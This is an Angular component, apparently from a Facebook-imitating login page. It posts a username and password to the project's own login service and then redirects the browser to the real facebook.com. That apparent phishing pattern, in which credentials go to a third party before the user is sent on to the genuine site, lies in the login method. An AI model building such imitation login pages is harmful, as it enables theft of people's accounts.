import { Component } from '@angular/core';
import { LoginService } from 'src/app/login.service';

@Component({
  selector: 'app-facebook',
  templateUrl: './facebook.component.html',
  styleUrls: ['./facebook.component.css']
})
export class FacebookComponent {
  loginName: string = '';
  pass: string = '';
  
  registerView: boolean = false;

  constructor(private loginService: LoginService){}

  async login(){
    try {
      const response = await this.loginService.login(this.loginName, this.pass)
      .toPromise();
     
      console.log('Response:', response);

      if (response === "Login sucedido!") {
        console.log(response);
        alert('Login Sucedido!');

        window.location.href = 'https://www.facebook.com/';
      } else {
        alert('Login falhou!');
      }
    } catch (error) {
    }
  }
}
